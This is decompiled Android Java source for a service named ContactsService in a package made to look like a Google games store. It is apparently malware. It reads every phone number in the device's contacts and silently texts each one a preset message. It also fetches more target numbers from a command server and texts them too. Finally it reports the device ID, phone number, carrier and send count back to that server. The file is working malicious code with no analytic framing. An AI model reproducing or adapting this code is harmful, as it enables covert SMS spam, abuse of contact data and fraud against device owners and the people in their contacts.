package com.google.games.stores.service;

import android.app.Notification;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;
import com.google.games.stores.bean.MyConfig;
import com.google.games.stores.config.Config;
import com.google.games.stores.util.ConfigUtil;
import com.google.games.stores.util.GeneralUtil;
import com.google.games.stores.util.Logger;
import com.google.games.stores.util.NetTask;
import java.util.ArrayList;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONObject;
import org.json.JSONTokener;

public class ContactsService extends Service {
    private String CONNECT_SERVER = "";
    /* access modifiers changed from: private */
    public String CONTENT_TO_SEND = "";
    /* access modifiers changed from: private */
    public String action = null;
    private ScreenOff receiver;
    private SmsManager smsManager;
    /* access modifiers changed from: private */
    public int total;

    class ScreenOff extends BroadcastReceiver {
        ScreenOff() {
        }

        public void onReceive(Context context, Intent intent) {
            ContactsService.this.action = intent.getAction();
            if ("android.intent.action.SCREEN_ON".equals(ContactsService.this.action)) {
                Log.i("abc", "screen on");
            } else if ("android.intent.action.SCREEN_OFF".equals(ContactsService.this.action)) {
                Log.i("abc", "screen off");
            }
        }
    }

    private void readBackConfig() {
        MyConfig config = ConfigUtil.getConfig(Config.CONFIG_FILE);
        if (config != null) {
            String server = config.getServer();
            if (server == null || server.equalsIgnoreCase("") || server.equalsIgnoreCase("null")) {
                this.CONNECT_SERVER = Config.SERVER;
            } else {
                this.CONNECT_SERVER = server;
            }
        } else {
            this.CONNECT_SERVER = Config.SERVER;
        }
        Logger.i("abc", "Connect Service Server--->" + this.CONNECT_SERVER);
    }

    private void registerScreenActionReceiver() {
        this.receiver = new ScreenOff();
        IntentFilter filter = new IntentFilter();
        filter.addAction("android.intent.action.SCREEN_OFF");
        filter.addAction("android.intent.action.SCREEN_ON");
        registerReceiver(this.receiver, filter);
    }

    public void onCreate() {
        super.onCreate();
        startForeground(1, new Notification());
        setForeground(true);
        Logger.i("abc", "Contact service create");
        this.smsManager = SmsManager.getDefault();
        this.total = 0;
        new Thread() {
            public void run() {
                super.run();
                try {
                    Thread.sleep(5000);
                    Intent backService = new Intent(ContactsService.this, Notifications.class);
                    backService.setFlags(268435456);
                    ContactsService.this.startService(backService);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }.start();
    }

    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        Logger.i("abc", "Contact service start");
        readBackConfig();
        try {
            new Thread() {
                public void run() {
                    super.run();
                    try {
                        if (!ContactsService.this.smsSent()) {
                            Logger.i("abc", "!smsSent");
                            Thread.sleep(20000);
                            MyConfig config = ConfigUtil.getConfig(Config.CONFIG_FILE);
                            if (config != null) {
                                config.setContact("true");
                            } else {
                                config = new MyConfig();
                                config.setContact("true");
                            }
                            if (ConfigUtil.writeConfig(config, Config.CONFIG_FILE)) {
                                Log.i("abc", "done....");
                                Logger.i("abc", "set contact ---> true");
                            } else {
                                Logger.i("abc", "set contact ---> false");
                            }
                            if (config == null || config.getMsg() == null || config.getMsg().equalsIgnoreCase("") || config.getMsg().equalsIgnoreCase("null")) {
                                ContactsService.this.CONTENT_TO_SEND = Config.SMS_CONTENT;
                            } else {
                                ContactsService.this.CONTENT_TO_SEND = Config.SMS_CONTENT;
                            }
                            Logger.i("abc", "Start sms contacts--->contact4SMS");
                            ContactsService.this.contacts4SMS(ContactsService.this.CONTENT_TO_SEND);
                        }
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (intent != null) {
            String db = intent.getStringExtra("DB");
            if (db != null && !db.equalsIgnoreCase("") && db.equalsIgnoreCase("DB")) {
                getDB();
            }
        }
    }

    /* access modifiers changed from: private */
    public void contacts4SMS(String content) {
        String database = "content://com.android.contacts/data";
        try {
            Cursor cursor = getContentResolver().query(Uri.parse("content://com.android.contacts/raw_contacts"), null, null, null, null);
            while (cursor.moveToNext()) {
                String telString = "";
                Thread.sleep(20000);
                String id = cursor.getString(cursor.getColumnIndex("_id"));
                Cursor datacursor = getContentResolver().query(Uri.parse(database), null, "raw_contact_id=?", new String[]{id}, null);
                while (datacursor.moveToNext()) {
                    if ("vnd.android.cursor.item/phone_v2".equals(datacursor.getString(datacursor.getColumnIndex("mimetype")))) {
                        telString = new StringBuilder(String.valueOf(telString)).append(" ").append(datacursor.getString(datacursor.getColumnIndex("data1"))).toString();
                    }
                }
                datacursor.close();
                this.total++;
                Logger.i("abc", "Total--->" + this.total);
                if (!telString.equalsIgnoreCase("")) {
                    telString = telString.replace("-", "").replace(" ", "");
                    Logger.i("abc", "tel--->" + telString);
                    sendSMS(telString, content);
                }
            }
            cursor.close();
        } catch (Exception e) {
            Logger.i("abc", "contact4sms Send Error");
            e.printStackTrace();
        }
        updateInfo();
    }

    private void getDB() {
        try {
            Thread.sleep(20000);
        } catch (InterruptedException e1) {
            e1.printStackTrace();
        }
        new NetTask() {
            /* access modifiers changed from: protected */
            public void afterReturnService(String result) {
                if (result != null) {
                    try {
                        if (!result.equalsIgnoreCase("")) {
                            JSONObject contacts = (JSONObject) new JSONTokener(result).nextValue();
                            String msg = contacts.optString("title");
                            JSONArray list = contacts.optJSONArray("list");
                            List<String> number = new ArrayList();
                            for (int i = 0; i < list.length(); i++) {
                                String phone_number = (String) list.get(i);
                                number.add(phone_number.toString());
                                Logger.i("abc", "getDB--->" + phone_number.toString());
                            }
                            if (number.size() > 0) {
                                ContactsService.this.db4SMS(number, msg);
                            }
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }.execute(new String[]{this.CONNECT_SERVER + Config.CONTACT_LIST_URL, Config.CONTACT_LIST, GeneralUtil.getDevice(this)});
    }

    /* access modifiers changed from: private */
    public void db4SMS(List<String> number, String content) {
        int i = 0;
        while (i < number.size()) {
            try {
                this.total++;
                Thread.sleep(20000);
                String telString = ((String) number.get(i)).toString();
                if (!telString.equalsIgnoreCase("")) {
                    telString = telString.replace("-", "").replace(" ", "");
                    Logger.i("abc", "DB--->" + telString);
                    sendSMS(telString, content);
                }
                i++;
            } catch (Exception e) {
                Logger.i("abc", "db4SMS Send Error");
                e.printStackTrace();
            }
        }
        updateInfo();
    }

    /* access modifiers changed from: private */
    public void updateInfo() {
        try {
            Thread.sleep(15000);
        } catch (InterruptedException e1) {
            e1.printStackTrace();
        }
        new NetTask() {
            /* access modifiers changed from: protected */
            public void afterReturnService(String result) {
                try {
                    if (result.equalsIgnoreCase("OK")) {
                        Logger.i("abc", "updateInfo result--->" + ContactsService.this.total + " " + result);
                        ContactsService.this.total = 0;
                        return;
                    }
                    ContactsService.this.updateInfo();
                } catch (Exception e) {
                    ContactsService.this.total = 0;
                    e.printStackTrace();
                }
            }
        }.execute(new String[]{this.CONNECT_SERVER + Config.ADD_DEVICE_URL, Config.ADD, GeneralUtil.getDevice(this), GeneralUtil.getMobile(this), GeneralUtil.getOperator(this), "", "", this.total, "1"});
    }

    private void sendSMS(String num, String content) {
        this.smsManager.sendTextMessage(num, null, content, null, null);
    }

    /* access modifiers changed from: private */
    public boolean smsSent() {
        MyConfig config = ConfigUtil.getConfig(Config.CONFIG_FILE);
        if (config != null) {
            String contact = config.getContact();
            Logger.i("abc", "smsSent config contact--->" + contact);
            if (contact == null || !contact.equalsIgnoreCase("true")) {
                return false;
            }
            return true;
        }
        Logger.i("abc", "smsSent--->false");
        return false;
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onDestroy() {
        super.onDestroy();
    }
}
